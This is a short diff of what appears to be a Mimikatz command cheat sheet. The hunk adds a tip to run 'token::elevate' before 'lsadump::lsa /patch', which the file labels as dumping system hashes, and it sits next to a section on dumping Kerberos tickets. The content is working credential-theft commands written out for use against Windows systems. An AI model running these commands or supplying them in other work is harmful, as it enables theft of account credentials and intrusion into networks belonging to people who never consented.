@@ -23,6 +23,7 @@ log customlogfilename.log
 
 # Dump hashes
 ;; this will dump system hashes
+;; if it does not work try first token::elevate
 lsadump::lsa /patch
 
 # Dump Tickets
